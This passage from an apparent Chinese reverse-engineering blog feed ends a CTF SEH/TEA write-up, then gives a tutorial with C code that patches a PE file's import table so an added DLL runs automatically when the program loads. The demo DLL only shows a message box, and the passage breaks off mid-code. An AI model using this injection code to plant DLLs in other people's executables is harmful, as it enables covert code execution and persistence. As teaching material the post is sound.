Debugger<br></code></pre></td></tr></table></figure><p>​这几句汇编是否觉得很熟悉，这不就是SEH安装流程嘛！。先回调函数压栈，再压入当前的<code>fs:[0]</code>，然后再将上一个SEH地址存储到<code>fs:[0]</code>，最后引发一个断点异常，所以此时关键就是那个回调函数<code>sub_5E12FD</code></p><p>​现在就来分析一下这个回调函数吧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">005E1</span>B50 push    ebp<br>.text:<span class="hljs-number">005E1</span>B51 mov     ebp, esp<br>.text:<span class="hljs-number">005E1</span>B53 sub     esp, <span class="hljs-number">0</span>C0h<br>.text:<span class="hljs-number">005E1</span>B59 push    ebx<br>.text:<span class="hljs-number">005E1</span>B5A push    esi<br>.text:<span class="hljs-number">005E1</span>B5B push    edi<br>.text:<span class="hljs-number">005E1</span>B5C mov     edi, ebp<br>.text:<span class="hljs-number">005E1</span>B5E xor     ecx, ecx<br>.text:<span class="hljs-number">005E1</span>B60 mov     eax, <span class="hljs-number">0</span>CCCCCCCCh<br>.text:<span class="hljs-number">005E1</span>B65 rep stosd<br>.text:<span class="hljs-number">005E1</span>B67 mov     ecx, offset unk_5EC063<br>.text:<span class="hljs-number">005E1</span>B6C call    j_@__CheckForDebuggerJustMyCode@<span class="hljs-number">4</span> ; __CheckForDebuggerJustMyCode(x)<br>.text:<span class="hljs-number">005E1</span>B71 push    offset aDx3906  ; <span class="hljs-string">&quot;DX3906&quot;</span><br>.text:<span class="hljs-number">005E1</span>B76 push    offset dword_5EA598<br>.text:<span class="hljs-number">005E1</span>B7B call    enc<br>.text:<span class="hljs-number">005E1</span>B80 add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E1</span>B83 push    offset aDoctor3 ; <span class="hljs-string">&quot;doctor3&quot;</span><br>.text:<span class="hljs-number">005E1</span>B88 push    offset unk_5EA5A0<br>.text:<span class="hljs-number">005E1</span>B8D call    enc<br>.text:<span class="hljs-number">005E1</span>B92 add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E1</span>B95 push    offset aFux1aoyun ; <span class="hljs-string">&quot;FUX1AOYUN&quot;</span><br>.text:<span class="hljs-number">005E1</span>B9A push    offset unk_5EA5A8<br>.text:<span class="hljs-number">005E1</span>B9F call    enc<br>.text:<span class="hljs-number">005E1</span>BA4 add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E1</span>BA7 push    offset aR3verier ; <span class="hljs-string">&quot;R3verier&quot;</span><br>.text:<span class="hljs-number">005E1</span>BAC push    offset dword_5EA5B0<br>.text:<span class="hljs-number">005E1</span>BB1 call    enc<br>.text:<span class="hljs-number">005E1</span>BB6 add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E1</span>BB9 mov     eax, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">005E1</span>BBE pop     edi<br>.text:<span class="hljs-number">005E1</span>BBF pop     esi<br>.text:<span class="hljs-number">005E1</span>BC0 pop     ebx<br>.text:<span class="hljs-number">005E1</span>BC1 add     esp, <span class="hljs-number">0</span>C0h<br>.text:<span class="hljs-number">005E1</span>BC7 cmp     ebp, esp<br>.text:<span class="hljs-number">005E1</span>BC9 call    j___RTC_CheckEsp<br>.text:<span class="hljs-number">005E1</span>BCE mov     esp, ebp<br>.text:<span class="hljs-number">005E1</span>BD0 pop     ebp<br>.text:<span class="hljs-number">005E1</span>BD1 retn<br></code></pre></td></tr></table></figure><p>​这个处理函数所执行的操作也是TEA加密，但是我们关注最后的返回值是1，也即<code>ExceptionContinueSearch</code>，也就是说操作系统认为这个处理函数没有真正处理异常，这就需要向外去找<code>__except</code>块代码来处理，但是在调用<code>__except</code>之前，操作系统还会再调用以一次这个函数，也就是我们之前提及的展开，可以把一段代码与初探展开的代码比较，会发现有异曲同工之妙。所以这一块涉及的密文需要两次TEA解密，这也是此题真正的考点。</p><p>​后续的内容都比较简单了，就是比较密文，相同即可得到flag，只要按部就班根据TEA解密就行了，不过需要注意的是后半部分的flag需要两次TEA解密，而且TEA使用的K数组是DWORD型的。</p><p>​完结！</p><p>参考资料：</p><p>1.《加密与解密》—— Windows下异常处理</p><p>2.<a href="https://blog.csdn.net/chenlycly/article/details/52575260?ydreferer=aHR0cHM6Ly93d3cuYmluZy5jb20v">深入解析结构化异常</a></p><p>3.《逆向工程核心原理》—— SEH部分</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>SEH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>SEH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构（END）</title>
    <link href="/2023/07/25/PE_10/"/>
    <url>/2023/07/25/PE_10/</url>
    
    <content type="html"><![CDATA[<p>导入表注入</p><span id="more"></span><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>导入表的意义是告诉操作系统我需要使用其他PE提供的什么函数，然后操作系统就会帮忙把这些DLL给加载进此4GB空间中。导入表里面又有两张表，分别是INT表和IAT表，两者在加载前的内容完全相同，在加载时IAT表则会发生变化，会更改为函数地址。</p><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在操作系统加载DLL时，会自动执行DLL本身的函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307252357875.png"></p><p>比如这里switch中的DLL_PROCESS_ATTACH,也即操作系统在加载此DLL时会自动执行这个分支里的语句，而操作系统又是根据导入表来加载DLL的，那么就可以由此制作一个DLL，在此分支里面执行想要的操作，在加载时就会自动执行，从而达到某种目的。</p><p>换句话说，我们需要人为在导入表里添加一项DLL，来骗过操作系统。但是会面临一个问题，即原来的导入表不够位置，因为操作系统是根据导入表最后的全0结构来判断是否导入表是否结束，如果说原来的导入表后面只有20个零（一个导入表结构的大小），那么显然是不能在此基础上添加导入表的，因为这样就会加载进错误的导入表，从而导致程序崩溃。</p><p>也就是说我们需要移动导入表！</p><h3 id="移动导入表"><a href="#移动导入表" class="headerlink" title="移动导入表"></a>移动导入表</h3><p>移动最好的方式是新开一个节，然后根据目录项开始逐表逐表copy，你可能有一个疑问——为什么要逐表，而不直接使用目录项的size成员呢？原因有二，第一这个size是不准确的，在许多编译器中都会将此值置0，你也可以自己把它设置成0，程序一样可以正常运行；第二这个size可能不只包含导入表，还可能包含了INT表，IAT表等所有的大小，但是我们只想copy单纯的导入表。</p><p>因此需要逐表逐表copy，然后用20字节来做新表的大小，再用20字节做结束的标志</p><h3 id="新增INT表、IAT表"><a href="#新增INT表、IAT表" class="headerlink" title="新增INT表、IAT表"></a>新增INT表、IAT表</h3><p>仅仅创建新表是不够的，因此此时表结构全为0，即使设置了DLL的名字。因为操作系统会看这个表的INT表、IAT表，如果这两张表为0，就说明没有用到这个DLL，就不会把他加载程序4GB空间。因此需要新增INT表、IAT表，我们只需要新增一项就可以使得操作系统加载DLL了。</p><p>同理INT表、IAT表也需要全零0结构作为结束，而这两张表表项大小是4字节，因此每一张表都需要8字节来完成新增操作。此后就是设置这两张表的表项，使其指向PIMAGE_IMPORT_BY_NAME结构（当然使用序号的方式也是可以的）</p><p>简单来说，就是重新构这几张表的指向关系，也就是如图的所有箭头</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307260019297.png"></p><p>只要重新建立这些箭头指向，也就代表一个新的导入表成功建立</p><p>注入成功标志就是在双击运行exe时，会执行注入DLL里的DLL_PROCESS_ATTACH分支里的语句，在本例中就是简单弹一个窗，在结束运行时则是运行DLL_PROCESS_DETACH分支里的语句，也是弹一个窗。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307260029222.png"></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>多说无益，直接看代码</p><p>NOTE：要注入的程序如果是32位，则只能使用32位的DLL；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ADD_SIZE 0x3000</span><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br>DWORD <span class="hljs-title function_">RVA_TO_FOA</span><span class="hljs-params">(DWORD RVA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br>    <br>    <span class="hljs-keyword">if</span> (RVA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> RVA;<br>&#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(RVA &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; RVA &lt; (SectionHeader+<span class="hljs-number">1</span>)-&gt;VirtualAddress)&#123;<br>            DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader +=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>     <span class="hljs-comment">//最后一个节区</span><br>    DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>&#125;<br><br>DWORD <span class="hljs-title function_">FOA_TO_RVA</span><span class="hljs-params">(DWORD FOA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader= <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-keyword">if</span> (FOA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> FOA;<br>&#125;<br><br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(FOA &gt;= SectionHeader-&gt;PointerToRawData&amp;&amp; FOA &lt; (SectionHeader +<span class="hljs-number">1</span>)-&gt;PointerToRawData)&#123;<br>            <br>            DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//最后一个节区</span><br>    DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>&#125;<br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">Section_add</span><span class="hljs-params">(FILE* fp,<span class="hljs-type">char</span>* buffer)</span>&#123;<br>    DWORD size =  Size(fp);<br>    DWORD new_size = size + ADD_SIZE ;<br><br>    <span class="hljs-type">char</span>* NewBuffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(new_size);<br>    <span class="hljs-keyword">if</span> (!NewBuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed to creat buffer!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">memset</span>(NewBuffer,<span class="hljs-number">0</span>,new_size);<br>    <span class="hljs-built_in">memcpy</span>(NewBuffer,buffer,size);<br><br>    <span class="hljs-comment">//初始化PE头部信息</span><br>DosHeader = (PIMAGE_DOS_HEADER)NewBuffer;<br>NTHeader = (PIMAGE_NT_HEADERS)(NewBuffer + DosHeader-&gt;e_lfanew);<br>FILEHeader = (PIMAGE_FILE_HEADER)(NewBuffer+DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//最后一个节表地址</span><br>PIMAGE_SECTION_HEADER LastSection = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader+IMAGE_SIZEOF_SECTION_HEADER*(FILEHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>));<br><span class="hljs-comment">//新节表地址</span><br>PIMAGE_SECTION_HEADER NewSection = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader + IMAGE_SIZEOF_SECTION_HEADER * (FILEHeader-&gt;NumberOfSections));<br><br>    <span class="hljs-comment">//判断剩余空间</span><br>    DWORD Remained_size = (DWORD)(OptionalHeader-&gt;SizeOfHeaders - DosHeader-&gt;e_lfanew - <span class="hljs-number">4</span><br>- IMAGE_SIZEOF_FILE_HEADER - IMAGE_SIZEOF_SECTION_HEADER * FILEHeader-&gt;NumberOfSections);<br><span class="hljs-keyword">if</span> (Remained_size &lt; <span class="hljs-number">2</span> * IMAGE_SIZEOF_SECTION_HEADER)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do not have enough space!\n&quot;</span>);<br><span class="hljs-built_in">free</span>(NewBuffer);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-comment">//===================修改信息====================</span><br><span class="hljs-comment">//其他头部需要修改的信息</span><br>FILEHeader-&gt;NumberOfSections += <span class="hljs-number">1</span>;<br>    OptionalHeader-&gt;SizeOfImage += ADD_SIZE;<br>    <br>    <span class="hljs-comment">//填入数据</span><br>    <span class="hljs-built_in">memcpy</span>(NewSection-&gt;Name,<span class="hljs-string">&quot;.NewSec&quot;</span>,<span class="hljs-number">8</span>);<br>    NewSection-&gt;Misc.VirtualSize = ADD_SIZE;<br>    NewSection-&gt;SizeOfRawData = ADD_SIZE;<br>    NewSection-&gt;PointerToRawData = LastSection-&gt;PointerToRawData + LastSection-&gt;SizeOfRawData;<br><br>DWORD add_size = LastSection-&gt;Misc.VirtualSize &gt; LastSection-&gt;SizeOfRawData ? LastSection-&gt;Misc.VirtualSize : LastSection-&gt;SizeOfRawData;<br><br>    NewSection-&gt;VirtualAddress = LastSection-&gt;VirtualAddress + add_size;<br><br>    <span class="hljs-comment">//找到开始的地方</span><br>    <span class="hljs-keyword">if</span> (NewSection-&gt;VirtualAddress % OptionalHeader-&gt;SectionAlignment)<br>&#123;<br>NewSection-&gt;VirtualAddress = NewSection-&gt;VirtualAddress / OptionalHeader-&gt;SectionAlignment * OptionalHeader-&gt;SectionAlignment +OptionalHeader-&gt;SectionAlignment;<br>&#125;<br><br>NewSection-&gt;Characteristics = <span class="hljs-number">0xC0000040</span>;<br><br>    <span class="hljs-keyword">return</span> NewBuffer;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">DLL_INJECT</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//初始化PE头部信息</span><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>FILEHeader = (PIMAGE_FILE_HEADER)(Buffer+DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//定位到新节区开始</span><br>    PIMAGE_SECTION_HEADER NewSec = SectionHeader + FILEHeader-&gt;NumberOfSections - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span>* pNewSec = Buffer + NewSec-&gt;PointerToRawData;<br>    <span class="hljs-comment">//定位到导入表</span><br>    DWORD Import_Rva = OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;<br>    DWORD Import_Foa = RVA_TO_FOA(Import_Rva,Buffer);<br>   <br>    PIMAGE_IMPORT_DESCRIPTOR pImport_Table =(PIMAGE_IMPORT_DESCRIPTOR)(Buffer + Import_Foa);<br>    <span class="hljs-comment">// printf(&quot;%d&quot;,OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);</span><br><br>    <span class="hljs-comment">//复制原导入表</span><br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(pImport_Table-&gt;FirstThunk)&#123;<br>        <span class="hljs-built_in">memcpy</span>(pNewSec + <span class="hljs-number">20</span>*index,(pImport_Table),<span class="hljs-number">20</span>);<br>        pImport_Table++;<br>        index++;<br>    &#125;<br><br>    <br>    <span class="hljs-comment">//指向新复制导入表结束</span><br>    PIMAGE_IMPORT_DESCRIPTOR New_Import = PIMAGE_IMPORT_DESCRIPTOR(pNewSec + index * <span class="hljs-number">20</span>);<br><br>    <span class="hljs-comment">//新增INT表，加40即是预留20字节作为导入表结束标志</span><br>    DWORD* New_INT = (DWORD*)(pNewSec + index * <span class="hljs-number">20</span>+ <span class="hljs-number">40</span>);<br>    <span class="hljs-comment">//新增IAT表，加48即是预留4字节作为INT结束标志</span><br>    DWORD* New_IAT =(DWORD*)(pNewSec + index * <span class="hljs-number">20</span> + <span class="hljs-number">48</span>);<br><br>    <span class="hljs-comment">//新增IMAGE_IMPORT_BY_NAME结构，加56同理</span><br>    PIMAGE_IMPORT_BY_NAME New_NAME = PIMAGE_IMPORT_BY_NAME(pNewSec + index * <span class="hljs-number">20</span> + <span class="hljs-number">56</span>);<br><br>    <span class="hljs-comment">//这里的名称一定要是DLL中导出的名称，否则程序无法正常运行</span><br>    <span class="hljs-built_in">memcpy</span>(New_NAME-&gt;Name,<span class="hljs-string">&quot;_add&quot;</span>,<span class="hljs-number">4</span>);<br><br>    <span class="hljs-comment">//设置新INT、IAT表指向，使其指向PIMAGE_IMPORT_BY_NAME结构，也就是右半部分的箭头</span><br>    *New_INT = FOA_TO_RVA((<span class="hljs-type">char</span>*)New_NAME - Buffer,Buffer);<br>    <br>    *New_IAT = FOA_TO_RVA((<span class="hljs-type">char</span>*)New_NAME - Buffer,Buffer);<br><br>    <span class="hljs-comment">//设置导入表的指向关系，使其指向新INT表、IAT表，也就是左半部分的箭头</span><br>    New_Import-&gt;OriginalFirstThunk = FOA_TO_RVA(((<span class="hljs-type">char</span>*)New_INT - Buffer),Buffer);<br>    New_Import-&gt;FirstThunk = FOA_TO_RVA((<span class="hljs-type">char</span>*)New_IAT - Buffer,Buffer);<br><br>    <span class="hljs-comment">//这里加100是随意的</span><br>    <span class="hljs-type">char</span>* New_DLL_NAME = pNewSec + index * <span class="hljs-number">20</span> + <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">memcpy</span>(New_DLL_NAME,<span class="hljs-string">&quot;Func.dll&quot;</span>,<span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">//导入表的NAME成员存储的是DLL名称的RVA，而非NAME本身</span><br>    New_Import-&gt;Name = FOA_TO_RVA(New_DLL_NAME - Buffer,Buffer);<br><br><span class="hljs-comment">//修改目录项，使其指向新导入表</span><br>    OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = NewSec-&gt;VirtualAddress;<br>&#125;<br><br><span 